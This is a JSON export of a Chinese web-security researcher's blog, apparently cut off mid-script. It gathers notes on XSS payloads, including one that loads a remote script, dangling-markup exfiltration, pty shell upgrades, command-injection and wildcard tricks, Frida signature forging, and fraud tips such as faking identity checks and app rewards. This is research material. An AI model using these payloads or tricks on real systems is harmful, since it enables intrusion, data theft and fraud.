{"meta":{"title":"5alt's Blog","subtitle":null,"description":null,"author":"md5_salt","url":"http://5alt.me"},"pages":[{"title":"关于我","date":"2016-09-27T15:38:47.000Z","updated":"2019-08-16T04:24:28.789Z","comments":true,"path":"about/index.html","permalink":"http://5alt.me/about/index.html","excerpt":"","text":"CTF退役选手，关注web安全，关注各种新奇好玩的东西 邮箱 md5_salt [AT] qq.com。 欢迎各位老板微信零钱打赏~"},{"title":"前端攻击 payload","date":"2018-12-10T16:00:00.000Z","updated":"2019-08-16T04:24:28.936Z","comments":true,"path":"knowledge/前端攻击payload.html","permalink":"http://5alt.me/knowledge/前端攻击payload.html","excerpt":"","text":"jaVasCript:/-//*\\/‘/“/*/(/ */oNcliCk=alert() )//%0D%0A%0d%0a//\\x3csVg/\\x3e 输入长度受限情况下的 XSS 攻击eval(name)name=\"d=document;s=d.createElement('script');s.src='//cm2.pw';d.body.appendChild(s)\";open('//victim.cm2.pw/?xss=Click','_self') javascript:eval(name);q// halts navigation because q is not defined//因为q没有被定义，因此导航会被终止 import (Chrome)https://victim.cm2.pw/?xss=Click 远程内容：javascript:alert(1) $.getScript (需要jQuery)Click $.get (jQuery &lt;= 3.00)返回content-type被设置为text/javascript 使用已有的elements和properties参考：https://blog.cm2.pw/length-restricted-xss/"},{"title":"","date":"2019-08-16T04:24:28.856Z","updated":"2019-08-16T04:24:28.856Z","comments":true,"path":"downloads/apk.brida.js","permalink":"http://5alt.me/downloads/apk.brida.js","excerpt":"","text":"'use strict'; // 1 - FRIDA EXPORTS var body = \"\"; rpc.exports = { // BE CAREFUL: Do not use uperpcase characters in exported function name (automatically converted lowercase by Pyro) exportedfunction: function() { // Do stuff... // This functions can be called from custom plugins or from Brida \"Execute method\" dedicated tab }, // Function executed when executed Brida contextual menu option 1. // Input is passed from Brida encoded in ASCII HEX and must be returned in ASCII HEX (because Brida will decode the output // from ASCII HEX). Use auxiliary functions for the conversions. contextcustom1: function(message) { Java.perform(function () { message = hexToString(message); if(message.endsWith(\"&\")){ message = message.substr(0, message.length-1); } message = message.replace(/\\+/gm, \" \"); var mapclass = Java.use('java.util.Map'); var map = Java.use('me.5alt.returnmap').a(null, \"\", 0); var vars = message.split('&'); for (var i = 0; i < vars.length; i++) { var pair = vars[i].split('='); map.put(decodeURIComponent(pair[0]), decodeURIComponent(pair[1])) } var timestamp = Date.parse(new Date()); timestamp = parseInt(timestamp / 1000); map.put('tm', String(timestamp)) map.put('si', \"233\") map.remove('si'); var sigtool = Java.use('me.5alt.signature.a'); var retval = sigtool.b(map, \"\", false) map.put('si', retval) body = \"\"; var iter = map.keySet().iterator(); while (iter.hasNext()) { var i = iter.next(); body += i + \"=\" + encodeURIComponent(map.get(i)) + \"&\" } body = body.substr(0, body.length-1); body = stringToHex(body); }); return body; }, // Function executed when executed Brida contextual menu option 2. // Input is passed from Brida encoded in ASCII HEX and must be returned in ASCII HEX (because Brida will decode the output // from ASCII HEX). Use auxiliary functions for the conversions. contextcustom2: function(message) { return \"6768\"+message; }, // Function executed when executed Brida contextual menu option 3. // Input is passed from Brida encoded in ASCII HEX and must be returned in ASCII HEX (because Brida will decode the output // from ASCII HEX). Use auxiliary functions for the conversions. contextcustom3: function(message) { return \"6768\"; }, // Function executed when executed Brida contextual menu option 4. // Input is passed from Brida encoded in ASCII HEX and must be returned in ASCII HEX (because Brida will decode the output // from ASCII HEX). Use auxiliary functions for the conversions. contextcustom4: function(message) { return \"6768\"; } } // 2 - AUXILIARY FUNCTIONS // Convert a hex string to a byte array function hexToBytes(hex) { for (var bytes = [], c = 0; c < hex.length; c += 2) bytes.push(parseInt(hex.substr(c, 2), 16)); return bytes; } // Convert a ASCII string to a hex string function stringToHex(str) { return str.split(\"\").map(function(c) { return (\"0\" + c.charCodeAt(0).toString(16)).slice(-2); }).join(\"\"); } // Convert a hex string to a ASCII string function hexToString(hexStr) { var hex = hexStr.toString();//force conversion var str = ''; for (var i = 0; i < hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16)); return str; } // Convert a byte array to a hex string function bytesToHex(bytes) { for (var hex = [], i = 0; i < bytes.length; i++) { hex.push((bytes[i] >>> 4).toString(16)); hex.push((bytes[i] & 0xF).toString(16)); } return hex.join(\"\"); } // 3 - FRIDA HOOKS (if needed) // Insert here Frida interception methods, if needed // (es. Bypass Pinning, save values, etc.)"},{"title":"js 代码段","date":"2017-10-08T16:00:00.000Z","updated":"2019-08-16T04:24:28.936Z","comments":true,"path":"knowledge/js代码段.html","permalink":"http://5alt.me/knowledge/js代码段.html","excerpt":"","text":"js 反调试一打开控制台就 debugger，一定是有setTimeout或者setInterval。1234567891011121314151617181920(function() &#123; (function a() &#123; try &#123; (function b(i) &#123; if (('' + (i / i)).length !== 1 || i % 20 === 0) &#123; (function() &#123;&#125; ).constructor('debugger')(); &#125; else &#123; debugger ; &#125; b(++i); &#125; )(0); &#125; catch (e) &#123; setTimeout(a, 5000); &#125; &#125; )()&#125;)(); 可以用TamperMonkey劫持函数，可以通过获取第一个参数，调用一个函数的toString方法获取函数的代码来判断函数的内容来精确定位某个函数。12window._setTimeout = window.setTimeout;window.setTimeout = function () &#123;console.log(arguments[0].toString())&#125;; 阻止控制台清空12345window.console.clear = function() &#123;&#125;;window.console._log = window.console.log;window.console.log = function (e) &#123; return window.console.error.apply(window.console._log, arguments);&#125;; 内置函数区分内置函数123456789101112131415161718192021222324252627282930313233// Used to resolve the internal `[[Class]]` of values var toString = Object.prototype.toString; // Used to resolve the decompiled source of functions var fnToString = Function.prototype.toString; // Used to detect host constructors (Safari &gt; 4; really typed array specific) var reHostCtor = /^\\[object .+?Constructor\\]$/; // Compile a regexp using a common native method as a template. // We chose `Object#toString` because there's a good chance it is not being mucked with. var reNative = RegExp('^' + // Coerce `Object#toString` to a string String(toString) // Escape any special regexp characters .replace(/[.*+?^$&#123;&#125;()|[\\]\\/\\\\]/g, '\\\\$&amp;') // Replace mentions of `toString` with `.*?` to keep the template generic. // Replace thing like `for ...` to support environments like Rhino which add extra info // such as method arity. .replace(/toString|(function).*?(?=\\\\\\()| for .+?(?=\\\\\\])/g, '$1.*?') + '$' ); function isNative(value) &#123; var type = typeof value; return type == 'function' // Use `Function#toString` to bypass the value's own `toString` method // and avoid being faked out. ? reNative.test(fnToString.call(value)) // Fallback to a host object check because some environments will represent // things like typed arrays as DOM methods which may not conform to the // normal native pattern. : (value &amp;&amp; type == 'object' &amp;&amp; reHostCtor.test(toString.call(value))) || false; &#125; 递归覆盖内置函数1234567891011121314151617181920212223242526272829303132333435function wrapit(e) &#123; if (e.__proto__) &#123; wrapit(e.__proto__); &#125; for (var a in e) &#123; try &#123; e[a]; &#125; catch (e) &#123; // pass continue; &#125; var prop = e[a]; if (!prop || prop._w) continue; prop = e[a]; if (typeof prop == 'function' &amp;&amp; isNative(prop)) &#123; e[a] = (function (name, func) &#123; return function () &#123; var args = [].splice.call(arguments,0); // convert arguments to array if (false &amp;&amp; name == 'getElementsByTagName' &amp;&amp; args[0] == 'iframe') &#123; &#125; else &#123; console.error((new Date).toISOString(), [this], name, args); &#125; if (name == 'querySelectorAll') &#123; //alert('querySelectorAll'); &#125; return func.apply(this, args); &#125;; &#125;)(a, prop); e[a]._w = true; &#125;; &#125;&#125;wrapit(window);wrapit(document); 参考资料http://www.jianshu.com/p/9148d215c119"},{"title":"一些思路和想法","date":"2017-02-26T16:00:00.000Z","updated":"2019-08-16T04:24:28.937Z","comments":true,"path":"learn/201702.html","permalink":"http://5alt.me/learn/201702.html","excerpt":"","text":"在此记录一些想法 hook innerHTML (2017-02-23)1234567891011121314151617(function () &#123; var setter = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set; Object.defineProperty(Element.prototype, 'innerHTML', &#123; set: function innerHTML_Setter(val) &#123; console.group(); console.log('innerHTML on Object:', this); console.log('Value:', JSON.stringify(val)); var stack = new Error().stack; // Remove this function from the stack: stack = stack.trim().split('\\n').slice(1).join(' &lt;- ') console.log('Stack: ', stack) console.groupEnd(); // call original innerHTML setter: return setter.call(this, val); &#125; &#125;);&#125;)(); 参考资料https://gist.github.com/mozfreddyb/a096627cc6b2e565a4c2 关闭chrome的安全措施方便检测xss (2017-02-23)alias unsafe=&#39;open -a Google\\ Chrome\\ Canary --args --disable-web-security --user-data-dir=$HOME/chrome_profile&#39; 302 响应跳转后的页面获取的referer不是发生跳转的url，而是发生跳转页面的referer (2017-02-22)这样微信oauth认证及时能控制回调地址也不能通过referer拿到code，只能看网站本身实现上会不会有信息泄露。 307/308 响应不改变请求method以及body (2017-02-14)可以用307或者308来获取post中的内容。与注入&lt;base&gt;标签配合。 前端只有一个页面降域只能拿cookie不影响其他页面 (2017-02-14)有 b.a.com 和 c.a.com 两个站，b.a.com 只有一个页面降域为a.com。在c.a.com执行javascript只能通过这一个降域的页面拿到b.a.com的cookie以及该页面的内容，不能拿到更多。原因是，用脚本降域之前，cookie值已经保存在document.cookie里。降域后，该页面的域已经和其他页面不同，故无法影响到其他页面。此时无法通过 c.a.com 把 b.a.com 中降域的页面恢复成 b.a.com 域。 MySQL 5.7 默认开启 Strict SQL Mode同时 MySQL 5.7.5 还开启了STRICT_TRANS_TABLES。因此MySQL无法弱类型转换了。 self+login/logout CSRF = PWN! (2017-02-09)在33c3 CTF里跟火日大佬学到的，先用一个iframe载入想要读取内容的页面，再用另一个iframe登陆自己的账号触发xss并读取到第一个iframe的内容。 参考资料http://www.geekboy.ninja/blog/airbnb-bug-bounty-turning-self-xss-into-good-xss-2/ jQuery Mobile XSS (需要上传任意内容文件文件或者open redirect) (2017-02-09)jq.html123&lt;link rel=&quot;stylesheet&quot; href=&quot;https://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.css&quot; /&gt;&lt;script src=&quot;https://code.jquery.com/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.js&quot;&gt;&lt;/script&gt; xss.jpg1&lt;img src=x onerror=alert(1)&gt; http://127.0.0.1/jq.html#/xss.jpg xss.jpg 不能用script标签，但是可以用on事件。 参考资料http://sirdarckcat.blogspot.com/2017/02/unpatched-0day-jquery-mobile-xss.html 在Chrome内置函数执行时，先取长度后解析参数可能导致越界读 (2017-02-08)在CVE-2016-4622中，Array.prototype.slice的native代码先取了数组的长度，后解析函数的参数。在取参数的时候，参数类型转换/用proxy/Array.prototype.__defineGetter__都可以将真正的数组修改掉，导致了两者不一致，发生越界读的问题。可以在源码级别找到这种模式批量扫。 参考资料http://drops.wiki/index.php/2016/12/10/jscpwn/http://paper.seebug.org/207/ js用ROP的思路混淆，保护页面版权 (2017-02-08)用html页面的内容动态生成js来做核心脚本的混淆，这样一旦被别人抄袭修了了html中的内容，那么js就会执行失败 参考资料http://div.io/topic/1220https://www.zhihu.com/question/47047191"},{"title":"一些思路和想法","date":"2017-03-26T16:00:00.000Z","updated":"2019-08-16T04:24:28.937Z","comments":true,"path":"learn/201703.html","permalink":"http://5alt.me/learn/201703.html","excerpt":"","text":"设备固件分析(2017-03-28)dump flash 中的固件最好用编程器，树莓派太不稳定加载到IDA中去，首先选择好处理器类型，然后寻找load address，即文件在内存中加载的地址。 参考资料https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/ race condition的时候不能用pool (2017-03-18)不知道为什么，用pool不能race成功。。 php中的回调函数 (2017-03-17)下载离线版php文档，参数里带callable的函数提取出来。找到内置常用的。1uasort|uksort|usort|array_diff_uassoc|array_diff_ukey|array_filter|array_intersect_uassoc|array_intersect_ukey|array_map|array_reduce|array_udiff_assoc|array_udiff_uassoc|array_udiff_uassoc|array_udiff|array_uintersect_assoc|array_uintersect_uassoc|array_uintersect_uassoc|array_uintersect|array_walk_recursive|array_walk|call_user_func_array|call_user_func|preg_replace_callback 正则中.不匹配换行 (2017-03-17)验证码与身份没有绑定，可以发完验证码之后替换掉身份做验证 (2017-03-16)在php中可以用extract变量覆盖来修改session (2017-03-16)chrome开启debug端口 (2017-03-15)12345678# 获取当前所有可调式页面信息http://127.0.0.1:9222/json# 获取调试目标 WebView/blink 的版本号http://127.0.0.1:9222/json/version# 创建新的 tab，并加载 urlhttp://127.0.0.1:9222/json/new?url# 关闭 id 对应的 tabhttp://127.0.0.1:9222/json/close/id 参考资料http://taobaofed.org/blog/2016/10/19/chrome-remote-debugging-technics/https://developer.chrome.com/devtools/docs/debugger-protocol"},{"title":"一些思路和想法","date":"2017-05-10T16:00:00.000Z","updated":"2019-08-16T04:24:28.937Z","comments":true,"path":"learn/201705.html","permalink":"http://5alt.me/learn/201705.html","excerpt":"","text":"Django 启用 https 支持有两种方案。 用stunnel 安装sudo apt-get install stunnel4 生成证书 123# openssl req -new -x509 -days 365 -nodes -out vpsee.pem -keyout vpsee.pem# chmod 600 vpsee.pem 新建配置文件 dev_https1234567891011# vi httpspid =cert = vpsee.pemdebug = 7foreground = yes[https]accept = 443connect = 8000# stunnel https 启动12stunnel dev_httpsHTTPS=on python manage.py runserver 8003 用 django-sslserver安装pip install django-sslserver 在 INSTALLED_APPS 里增加 1234INSTALLED_APPS = (...&quot;sslserver&quot;,...) 运行python manage.py runsslserver --certificate /path/to/certificate.crt --key /path/to/key.key 参考资料https://www.ianlewis.org/en/testing-https-djangos-development-serverhttps://github.com/teddziuba/django-sslserver git 搜索历史文件中出现的字符串git log -S/-G/--all -S 字符串方式查找改变了行数的不同的地方 -G 正则的方式匹配所有的改变 git log -Sbar -- foo.rb 在 foo.rb 文件中搜所有的历史 django 默认的模板引擎没有模板注入但是模板中的 load 功能可以载入服务器上python文件？ php 中 random 连续使用可能造成随机数预测"},{"title":"一些思路和想法","date":"2017-04-16T16:00:00.000Z","updated":"2019-08-16T04:24:28.937Z","comments":true,"path":"learn/201704.html","permalink":"http://5alt.me/learn/201704.html","excerpt":"","text":"通过更改font来改变字符对应的显示把1映射成2 waf 绕过%0a新开一行，行内注释来干扰waf ofo 刷红包ofo车是没有定位功能，只能靠用户的手机。老版的ofo只能手机解锁，手机结束行程。目前ofo的红包规则为在某个区域解锁车，所以只需要在红包区域内随便找一个老版的ofo车的编号手机解锁，10分钟后结束行程即可。因此只要模拟GPS位置信息，就可以刷红包了。 关于实名认证很多网络的实名认证只看的是姓名对不对应，身份证号作为隐私一般不去进行验证。所以，只要找到与自己的名字相同的人，获取其身份证号，就能伪造自己的身份。所以取一个大众名字很重要。"},{"title":"一些思路和想法","date":"2017-06-05T16:00:00.000Z","updated":"2019-08-16T04:24:28.937Z","comments":true,"path":"learn/201706.html","permalink":"http://5alt.me/learn/201706.html","excerpt":"","text":"php中用unserialize进行sql注入在 foxglovesecurity 的文章中，自定义的escape函数没有对object进行处理，导致利用存在__toString方法的对象即可绕过escape函数，进行注入。文章里的方法是从cms源码中找了一个有__toString的类然后反序列化。其实，php自带有很多实现了__toString方法的类。可以用php自带的类进行注入。比较通用的是Exception类，但是有额外的输出。其他的要么不能被序列化，要么需要另外安装插件。 参考资料https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/ php7 和 php5 的 mt_rand 函数算法不一致爆破种子工具 http://www.openwall.com/php_mt_seed/ 只适用于php5 安卓打印窗口栈dumpsys window 安卓只看某个包的logadb -d logcat com.tencent.gallerymanager:I *:S 参考资料https://developer.android.com/studio/command-line/logcat.html Autobinding 对象自动绑定漏洞对象自动绑定被许多框架支持（比如Spring MCV）, 它允许将HTTP请求参数自动的绑定到对象。然而攻击者可以添加额外的HTTP请求参数，如果开发人员在处理业务逻辑时缺少安全校验就会导致相应的安全问题。 参考资料http://agrrrdog.blogspot.ru/2017/03/autobinding-vulns-and-spring-mvc.htmlhttps://threathunter.org/topic/593ff6bc9c58e020408a79d4 在csrf中，用csp限制请求的范围只清除某个子域名的cookie 参考资料http://cb.drops.wiki/drops/web-14035.html LFI的时候包含session和tmp文件在用户名里或者昵称里注入payloadtmp文件的文件名在windows下用通配符 mysql下udf很难成功是因为plugin文件夹一般没权限windows 用户降权https://github.com/3gstudent/From-System-authority-to-Medium-authorityhttps://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8/ 反弹shell变成ttypython -c ‘import pty;pty.spawn(“/bin/bash”);’ php 用 mail 函数来bypass open_basedir 和 disabled_functions根据MTA的不同，查看命令参数，来执行命令或者读取文件，常见利用方法是用mail函数的第五个参数来指定配合文件执行额外命令 参考资料https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html ///host.com///host.com is parsed as a path-relative URL by Ruby’s URI library but it’s treated as a protocol-relative URL by Chrome and Firefox. arm的模式arm代码有arm模式和thumb模式，thumb模式下地址可能是2或者4的倍数，arm模式下一定是4的倍数。在模拟执行的时候，需要address | 1来区分模式。在一个二进制中可能同时有arm模式和thumb模式。 安卓 ida 调试12345adb push android_server /data/local/tmpchmod 755 android_serversu/android_server &amp;adb forward tcp:23946 tcp:23946"},{"title":"一些思路和想法","date":"2017-07-01T16:00:00.000Z","updated":"2019-08-16T04:24:28.937Z","comments":true,"path":"learn/201707.html","permalink":"http://5alt.me/learn/201707.html","excerpt":"","text":"通过更改font来改变字符对应的显示在chrome浏览器中，’///www.qq.com’将请求www.qq.com，而在php和python的urlparse均不能和浏览器保持一种 android tcpdump./tcpdump -i any -p -s 0 -w /sdcard/capture.pcap 固件运行http server可能将0重定向到网络输入，用content-length来控制webserver读到的长度，实际可以发送更长，/proc/self/fd/0指向的是当前的网络输入。 备份功能备份在还原的时候能否覆盖文件"},{"title":"一些思路和想法","date":"2017-08-09T16:00:00.000Z","updated":"2019-08-16T04:24:28.937Z","comments":true,"path":"learn/201708.html","permalink":"http://5alt.me/learn/201708.html","excerpt":"","text":"firefox data协议性质firefox data协议默认当成text/html，即使不认识，此时会把url里的空格去掉且进行一次url解码data:sd,&lt;scri pt&gt;con firm(docume nt.domai n)&lt;%2fscript&gt; chrome里默认当成text/plain curl -F 上传文件用curl发送请求，看到http头中有multipart/form-data的时候，考虑参数能否用@注入上传本地文件。 测试url跳转的时候除了JavaScript协议还有data协议上传文件名php本身会对上传文件名取basenameflask没有对上传文件名进行处理，但是提供了secure_filename函数django默认进行了处理 zip 加密已知明文攻击有其中一个文件的明文信息，就能解剩下的文件可用Advanced Archive Password Recovery"},{"title":"一些思路和想法","date":"2017-08-31T16:00:00.000Z","updated":"2019-08-16T04:24:28.938Z","comments":true,"path":"learn/201709.html","permalink":"http://5alt.me/learn/201709.html","excerpt":"","text":"java用GET代替POSTjava 程序员大多用request来获取参数，可以把POST的参数放到GET php 里的 format string格式化字符串的padding123456printf(\"[%s]\\n\", $s); // standard string outputprintf(\"[%10s]\\n\", $s); // right-justification with spacesprintf(\"[%-10s]\\n\", $s); // left-justification with spacesprintf(\"[%010s]\\n\", $s); // zero-padding works on strings tooprintf(\"[%'#10s]\\n\", $s); // use the custom padding character '#'printf(\"[%10.10s]\\n\", $t); // left-justification but with a cutoff of 10 characters 格式化字符串使用的参数位置12&apos;The %2$s contains %1$04d monkeys&apos;%后的数字代表第几个参数，$后代表类型 payload%1$’%s’中的’%被视为使用%进行 padding，导致了’的逃逸 https://paper.seebug.org/386/ windows Command Line Escape123ping www&quot; &amp; whoami 不能执行到whoamiping www^&quot; &amp; whoami 能执行到whoamiping &quot;www^&quot; &amp; whoami 能执行到whoami ^ 是Command Line Escape符号，用于转义www^ 被双引号引起来，^就没有转义功能了 https://ss64.com/nt/syntax-esc.htmlhttp://www.robvanderwoude.com/escapechars.php"},{"title":"一些思路和想法","date":"2017-10-10T16:00:00.000Z","updated":"2019-08-16T04:24:28.938Z","comments":true,"path":"learn/201710.html","permalink":"http://5alt.me/learn/201710.html","excerpt":"","text":"git 查看单个文件修改历史git log -p filenamegit log –follow &lt;文件名&gt; 关于Unicode和UTF-8Unicode是数字到字符的映射，UTF-8是表现形式。Unicode长度为2 bytes, UTF-8长度1-4个Byte。 UTF-8一字节时范围是[00-7F]两字节时范围是[C0-DF][80-BF]三字节时范围是[E0-EF][80-BF][80-BF]四字节时范围是[F0-F7][80-BF][80-BF][80-BF] UTF-8 非最短形式造成一些绕过，本来一个或者两个字节就能表示，扩充到4个字节表示。单字节空字符”0x00”双字节形式表示的空字符”0xc080” 在程序内部处理的时候，UTF8输入转成了Unicode，可能造成waf绕过，如果对Unicode当做bytearray来处理的话，也可能会造成一些问题。c语言中容易出现把输入当成bytearray处理的问题。 输入和处理时编码理解不一致处理和输出时编码理解不一致 js和python里会对unicode有特殊标记而php中不会，1234567&lt;?php$name = \"∾\";$name = iconv('UTF-8', 'UCS-2', $name);echo $name.\"\\n\";echo str_replace('\"', '', $name);// \"&gt;// &gt; 参考资料http://blog.csdn.net/c465869935/article/details/54407084https://www.leavesongs.com/PENETRATION/mysql-charset-trick.htmlhttps://zh.wikipedia.org/wiki/UTF-8 whois ip可以得到公司的ip段1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859➜ ~ ping www.tencent.comPING ssd.tcdn.qq.com (203.205.158.56): 56 data bytes64 bytes from 203.205.158.56: icmp_seq=0 ttl=57 time=43.262 ms^C--- ssd.tcdn.qq.com ping statistics ---1 packets transmitted, 1 packets received, 0.0% packet lossround-trip min/avg/max/stddev = 43.262/43.262/43.262/0.000 ms➜ ~ whois 203.205.158.56...inetnum: 203.205.128.0 - 203.205.159.255netname: TENCENT-NET-APdescr: Shenzhen Tencent Computer Systems Company Limiteddescr: Tencent Building, Kejizhongyi Avenue,Hi-techPark,descr: NanshanDistrict, Shenzhencountry: CNadmin-c: DR196-APtech-c: JW2054-APmnt-by: MAINT-CNNIC-APmnt-routes: MAINT-TENCENT-NET-AP-CNmnt-irt: IRT-CNNIC-CNstatus: ALLOCATED PORTABLEchanged: hm-changed@apnic.net 20110411source: APNICperson: Dreams Ruanaddress: Tencent Building, Kejizhongyi Avenue, Hi-techPark,Nanshan District,Shenzhencountry: CNphone: +86-755-86013388-84520fax-no: +86-755-86013030e-mail: dreamsruan@tencent.comnic-hdl: DR196-APmnt-by: MAINT-CNNIC-APchanged: ipas@cnnic.cn 20100510source: APNICperson: Jsquare Wuaddress: Tencent Building, Kejizhongyi Avenue, Hi-techPark,Nanshan District,Shenzhencountry: CNphone: +86-755-86013388-88441fax-no: +86-755-86013030e-mail: jsquare@tencent.comnic-hdl: JW2054-APmnt-by: MAINT-CNNIC-APchanged: ipas@cnnic.cn 20100510source: APNIC% Information related to &apos;203.205.128.0/19AS132203&apos;route: 203.205.128.0/19descr: Tencent routesorigin: AS132203notify: martyma@tencent.commnt-lower: MAINT-TENCENT-NET-AP-CNmnt-routes: MAINT-TENCENT-NET-AP-CNmnt-by: MAINT-TENCENT-NET-AP-CNchanged: martyma@tencent.com 20130109source: APNIC% This query was served by the APNIC Whois Service version 1.88.15-43 (WHOIS-JP4) php 反序列化关注魔术方法和__autoload。 1__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() 参考资料http://php.net/manual/zh/language.oop5.magic.php"},{"title":"一些思路和想法","date":"2018-01-15T16:00:00.000Z","updated":"2019-08-16T04:24:28.938Z","comments":true,"path":"learn/201801.html","permalink":"http://5alt.me/learn/201801.html","excerpt":"","text":"渗透测试windows 抓包12netsh trace start capture=yes persistent=yes traceFile=&quot;c:\\\\test\\\\snmp1.etl&quot; overwrite=yes correlation=no protocol=tcp ipv4.address=192.168.62.130 keywords=ut:authenticationNetsh trace stop 文件服务器抓其他用户 hash https://xianzhi.aliyun.com/forum/topic/1945 xss抓 Windows hash csp 控制页面加载使用CSP头来iframe的地址，这样浏览器就不会跳转，进而执行我们插入的HTML domain fronting利用cdn给的域名（一般被标记为可信域名），来转发流量，绕过对恶意域名的检测。如用Cobalt Strike的http上线。 object 和 embed 标签可以远程加载文件，但加载的文件域还是远程的域urllib头注入可绕过"},{"title":"一些思路和想法","date":"2017-10-31T16:00:00.000Z","updated":"2019-08-16T04:24:28.938Z","comments":true,"path":"learn/201711.html","permalink":"http://5alt.me/learn/201711.html","excerpt":"","text":"flash 固件逆向首先观察flash，分几块，结构是什么样子的 oauth redirect_url检查localhost是否是一个magic word（可能调试留下的代码） 挖洞套路关注官方博客看最新功能，根据新功能的样例进行变异 长度受限的命令执行（php）上传文件Linux下php上传文件临时文件会存放到/tmp下，文件名为phpXXXXLinux下通配符匹配在执行的时候只会取第一个用. /*/*R的方式，当上传文件临时文件名最后一个字母为R的时候，可以匹配到/tmp/phpXXXR，然后执行 vi swp文件在system(&#39;vi 1.php&#39;)的时候，会产生.1.php.swp，可以下载到 用文件名当做命令\\一行命令变成多行写ls -t根据时间排序文件，将命令倒着写过去错误命令不影响下面的执行命令ls，根据名称排序，空格等最前，数字其次，字母最后用&gt;创建文件，用&gt;&gt;追加内容 先将ls -t写入文件123456&gt;ls\\\\ls&gt;_&gt;\\ \\\\&gt;-t\\\\&gt;\\&gt;qls&gt;&gt;_ 此时 sh _ 即可ls -t&gt;q，接下来倒着写要执行的命令，然后执行即可 在bash里，测试时最后的\\需要转义，但是传入到system里之后就不需要两个\\了（在osx下仍然需要两个！） *会匹配文件名如果当期目录下有一个文件名为whoami，而w*能匹配到这个文件。在bash里执行w*则执行whoami 1234&gt;tar&gt;vcf&gt;zzz* / == tar vcf zzz / 用pr命令处理文本 Android webview debugWebView.setWebContentsDebuggingEnabled(true)即开启了webview的调试，手机usb连到电脑上chrome访问chrome://inspect/#devices即可远程调试。浏览器可以调用的特殊 API 在window、navigator、external三个位置上都可以找到。document.write(Object.keys(window).join(&#39;\\n&#39;))对于 Android App 的 WebView，可以直接逆向为 .jar 后搜索addJavaScriptInterface函数，看到浏览器到底给 JavaScript 暴露了哪些东西。 Android URL Scheme在AndroidManifest.xml里有定义。grep -o &quot;android:scheme=.*/&quot; AndroidManifest.xml在smali中搜索对应的URL Scheme可能可以找到使用样例 到对应的Activity中找相关处理的逻辑。&quot;android.intent.action.VIEW&quot;代表用网页打开，可能会用getQueryParameter来处理URL的参数。 osx URL Scheme/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -B6 &quot;bindings:.*:&quot;"},{"title":"一些思路和想法","date":"2018-05-31T16:00:00.000Z","updated":"2019-08-16T04:24:28.939Z","comments":true,"path":"learn/201806.html","permalink":"http://5alt.me/learn/201806.html","excerpt":"","text":"一些语言中用dns解析判断是否是内网的方式预防SSRF可以用DNS Rebind攻击在nodejs里成功 java中new URL()低版本下，host处可以CRLF。5alt.me\\r\\naaa: bbb\\r\\n会被当做host，而libc中去获取ip的时候会忽略掉错误的部分。可以用file://读本地文件可以用file:///列目录可以用?截断 Dangling markup插入一个未闭合src的img标签，把后面的html泄露出来&lt;img src=&quot;https://evilserver/? 绕过csp泄露内容用base标签的target属性设置window.name，把后面的html泄露出来，当受害者点击链接跳转到攻击者页面后，就能泄露出来&lt;base target=&quot;blah https://portswigger.net/blog/evading-csp-with-dom-based-dangling-markup 用通配符来提权在 bash 里用 * 的时候实际上会展开，如果有个文件的文件名是--help就会当成一个参数开关来执行。有些高权限程序执行命令带*的时候可能会出问题。"},{"title":"一些思路和想法","date":"2017-06-11T16:00:00.000Z","updated":"2019-08-20T02:59:59.988Z","comments":true,"path":"learn/index.html","permalink":"http://5alt.me/learn/index.html","excerpt":"","text":"201702 201703 201704 201705 201706 201707 201708"},{"title":"自己写的一些小工具","date":"2017-06-11T16:00:00.000Z","updated":"2019-08-16T04:24:28.940Z","comments":true,"path":"tools/index.html","permalink":"http://5alt.me/tools/index.html","excerpt":"","text":"tornado-proxy用 tornado 实现的 http/https 代理，可以 hook 请求和响应，比 proxy2 性能更好。 https://github.com/5alt/tornado-proxy VulHint一款 sublime text 3 插件，可以用正则表达式自定义高亮规则，对可能存在问题的函数或者点进行提示，方便代码审计。 https://github.com/5alt/VulHint 微信运动刷步数参考微信iot平台文档，自己成为一个手环设备生产商并伪造一个运动手环，欺骗微信运动来获取假的运动步数。 https://github.com/5alt/wechat-fakesteps autoSqlmap挂上代理浏览网页，请求会自动传到sqlmap中进行扫描。 https://github.com/5alt/autoSqlmap emu基于 unicorn 的代码模拟执行 https://github.com/5alt/emu GitLeakGitLeak 是一个从 Github 上查找密码信息的小工具。 https://github.com/5alt/GitLeak ZeroScanZeroScan 利用api以及爆破的方式收集子域名，并快速扫描相关ip的端口，并生成报告 https://github.com/5alt/ZeroScan hridahrida 是通过 frida 来暴露出安卓里的一些接口，并以 http 的方式进行远程调用。 https://github.com/5alt/hrida ultrarelay在 java 环境下进行 SMB 反射攻击。 https://www.youtube.com/watch?v=VyoyA2GgKck https://github.com/5alt/ultrarelay"},{"title":"一些思路和想法","date":"2018-10-07T16:00:00.000Z","updated":"2019-08-16T04:24:28.939Z","comments":true,"path":"learn/201810.html","permalink":"http://5alt.me/learn/201810.html","excerpt":"","text":"X-HTTP-Method-Override在有反向代理型 WAF 站中用X-HTTP-Method-Override可能能发送 PUT 等请求 xss payload11 &apos;&quot;\\&apos;\\&quot; onmouseover=alert`0` &lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/scRipt/--!&gt;&lt;img/src/onerror=&apos;;alert(0);&apos;&gt; csp 绕过RTCPeerConnection + DNS 传输数据1&lt;script&gt;window.addEventListener(\"load\", function()&#123;var peerConn=new 